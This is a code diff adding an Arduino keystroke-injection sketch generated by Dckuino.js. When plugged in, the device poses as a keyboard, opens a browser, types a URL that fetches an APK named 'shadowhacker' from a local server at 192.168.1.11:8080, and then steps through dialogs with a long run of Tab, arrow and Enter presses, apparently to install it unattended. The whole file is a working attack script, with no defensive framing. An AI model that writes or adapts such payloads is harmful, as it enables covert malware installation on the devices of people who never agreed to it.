@@ -1,0 +1,142 @@
+/*
+ * Generated with <3 by Dckuino.js, an open source project !
+ */
+
+#include "Keyboard.h"
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(500);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('b');
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('l');
+  Keyboard.releaseAll();
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('d');
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  Keyboard.print(F("http://192.168.1.11:8080/shadowhacker.apk"));
+
+  delay(200);
+
+  typeKey(KEY_RETURN);
+
+  delay(3000);
+
+  typeKey(KEY_F10);
+
+  delay(500);
+
+  typeKey(KEY_TAB);
+
+  delay(500);
+
+  typeKey(KEY_TAB);
+
+  delay(500);
+
+  typeKey(KEY_TAB);
+
+  delay(500);
+
+  typeKey(KEY_TAB);
+
+  delay(500);
+
+  typeKey(KEY_TAB);
+
+  delay(500);
+
+  typeKey(KEY_RETURN);
+
+  delay(300);
+
+  typeKey(KEY_DOWN_ARROW);
+
+  typeKey(KEY_DOWN_ARROW);
+
+  typeKey(KEY_RETURN);
+
+  delay(500);
+
+  typeKey(KEY_TAB);
+
+  typeKey(KEY_RETURN);
+
+  delay(500);
+
+  typeKey(KEY_TAB);
+
+  typeKey(KEY_TAB);
+
+  typeKey(KEY_RETURN);
+
+  delay(10000);
+
+  typeKey(KEY_TAB);
+
+  typeKey(KEY_TAB);
+
+  delay(900);
+
+  typeKey(KEY_RETURN);
+
+  typeKey(KEY_TAB);
+
+  delay(900);
+
+  typeKey(KEY_RETURN);
+
+  delay(900);
+
+  typeKey(KEY_DOWN_ARROW);
+
+  typeKey(KEY_DOWN_ARROW);
+
+  typeKey(KEY_DOWN_ARROW);
+
+  typeKey(KEY_DOWN_ARROW);
+
+  typeKey(KEY_DOWN_ARROW);
+
+  typeKey(KEY_DOWN_ARROW);
+
+  typeKey(KEY_DOWN_ARROW);
+
+  typeKey(KEY_DOWN_ARROW);
+
+  delay(900);
+
+  typeKey(KEY_TAB);
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
